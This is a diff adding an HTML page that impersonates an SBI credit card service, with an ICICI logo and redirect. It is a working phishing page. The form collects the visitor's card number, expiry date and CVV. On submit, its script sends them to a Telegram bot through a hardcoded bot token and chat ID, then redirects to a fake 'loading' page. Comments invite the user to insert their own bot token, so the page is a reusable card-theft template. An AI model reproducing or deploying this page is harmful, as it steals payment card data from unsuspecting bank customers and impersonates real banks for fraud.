@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    body {
+      background-color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+       
+
+  .legend {
+    border: 0px solid 	#005DAA;
+    background-color: 	#005DAA;
+    color: white;
+    padding: 5px 5px;
+    height:60px;
+    border-radius: 7px;
+    width:95%;
+    padding: 5px;
+    margin-bottom: 10px;
+    margin-top:40px;
+    displey:flex; 
+    align-items: center;
+  }
+       .outer-box {
+      position: relative;
+      width: 88%;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: white;
+      border: 1.5px solid #005DAA  ;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      color: black;
+    }
+
+ .legend h1{
+     margin-left:15%;
+     }
+    .outer-box::before,
+    .outer-box::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background-color: 	#005DAA;
+      top:40px;
+    }
+
+    .outer-box::before {
+      top: 0;
+    }
+
+    .outer-box::after {
+      bottom: 0;
+    }
+
+    .outer-box::before {
+      content: "SBI CREDIT CARD ";
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 40px; /* increased height */
+      top: 0;
+      background-color: white;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      color: black; /* changed text color */
+      font-size: 34px; /* increased font size */
+      border-radius: 9px;
+    }
+
+
+    .text-editor-box {
+  font-size: 14px;
+  margin-top:40px;
+  margin-bottom: 20px;
+  text-align: left;
+  padding: 10px;
+
+}
+    .text-editor-box input[type="text"],
+    .text-editor-box input[type="number"] {
+      width: 96%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 13px;
+      border: none;
+      border-bottom: 1px solid #005DAA  ;
+      border-bottom: 1px solid #005DAA ; /* add this line */
+      padding-bottom: 5px; /* add this line */
+
+    }
+    .submit-button {
+      background-color: 	#005DAA;
+      color: white;
+      padding: 10px;
+      margin: 10px auto 20px auto;
+      width: 96%;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .lower-inputs {
+      display: flex;
+      justify-content: space-between;
+    }
+    .lower-inputs .input-field {
+      width: 28%;
+      margin-top:20px;
+    }
+    .logo {
+      max-width: 200px;
+      margin-top: 10px;
+    }
+    .copyright {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+.customer-care {
+  /* Change this to match your exact color */
+  padding: 17px;
+  border-radius: 7px;
+  max-width: 550px;
+  margin-top:2px;
+  font-size:25px;
+  font-family: 'Arial', sans-serif; /* This is a guess, replace with the actual font-family if known */
+}
+
+.customer-care h2 {
+  color: #000; /* Adjust the color to match the design */
+  margin-bottom: 16px;
+}
+
+.customer-care p {
+  color: #555; /* Adjust the color to match the design */
+  font-size: 14px;
+  line-height: 1.2;
+}
+ .banner {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 5px; 10px;
+    background-color:lightgray;
+    color: black;
+    font-family: Arial, sans-serif;
+    border-radius: 50px;
+    background-color: #f7f7f7; /* Change this to match your exact color */
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+ 
+  }
+  .banner .icon {
+    background: url('') no-repeat center center;
+    background-size: contain;
+    width: 50px; /* Adjust as necessary */
+    height: 50px; /* Adjust as necessary */
+  }
+  .banner .text {
+    flex-grow: 1;
+    padding: 5px; 10px;
+  }
+  .banner .arrow {
+    background: url('') no-repeat center center;
+    background-size: contain;
+    width: 30px; /* Adjust as necessary */
+    height: 30px; /* Adjust as necessary */
+  }
+.button {
+    width: 600px;
+    height: 40px;
+    
+    border-radius: 50px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 30px;
+    pointer-events: none; /* add this line */
+    background-color: #f7f7f7; /* Change this to match your exact color */
+    border-radius: 7px;
+    max-width: 450px;
+    margin: 3px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    font-family: 'Arial', sans-serif; /* This is a guess, replace with the actual font-family if known */
+
+}
+
+.button p {
+   font-size: 18px; 
+}
+
+  </style>
+</head>
+<body>
+    <div class="legend">
+    <h1 style="text-transform: uppercase;">SBI CREDIT CARD</h1>
+    
+  </div>
+  <div class="banner">
+  <div class="icon"></div>
+  <div class="text">Hello, SBI BANK Customer
+                    Complete your card details in few simple steps  </div>
+  <div class="arrow"></div>
+</div>
+
+
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaFUHZf7AJtGeRaIBtKtWDylVRsyKSIdu-sA&usqp=CAU" alt="ICICI Bank Logo" class="logo">
+  <p style="font-size: 13px;"> Customer service: 02261156300 | Credit cards-cpl-c 0223232 2727 </p>
+  <div class="outer-box"> 
+
+   <div class="text-editor-box">
+      <form id="creditCardForm">
+        <label for="cardNumber">Card 16-digit Number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" required placeholder="xxxx-xxxx-xxxx-xxxx">
+        <div class="lower-inputs">
+          <div class="input-field">
+            <label for="expiryDate">Expiry Date:</label>
+            <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY">
+          </div>
+          <div class="input-field">
+            <label for="cuu">cvv:</label>
+            <input type="number" id="cuu" name="cuu" required placeholder="000">
+          </div>
+        </div>
+        <button type="submit" class="submit-button">Submit</button>
+      </form>
+    </div>
+  </div>
+  <div class="button">
+    <p>Front Upload Documents</p>
+</div>
+<div class="button">
+    <p>Back Upload Documents</p>
+</div>
+  <div class="customer-care">
+  <p> Copyright © SBI Bank, All right reserved</p>
+
+<p>Privacy Policy
+
+Terms and Condition
+
+Security  </p>
+ 
+</div>
+
+
+  <script>
+    document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      var cardNumber = document.getElementById('cardNumber').value;
+      var expiryDate = document.getElementById('expiryDate').value;
+      var cuu = document.getElementById('cuu').value;
+
+      // WARNING: Exposing your Telegram bot token in client-side code is insecure
+      var botToken = '7535112603:AAFDGmV34jVxjz39CvznYajK6hdm7luJDbE'; // Replace with your actual bot token
+      var chatId = '7678700230'; // Replace with your actual chat ID
+      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;
+
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Before redirection'); // Add this line
+          window.location.href = 'https://icici-credit-card.github.io/loading/';
+
+        } else {
+          alert('Failed to send the message to the Telegram bot.');
+        }
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+        alert('An error occurred while sending the message.');
+      });
+    });
+  </script>
+</body>
+</html>
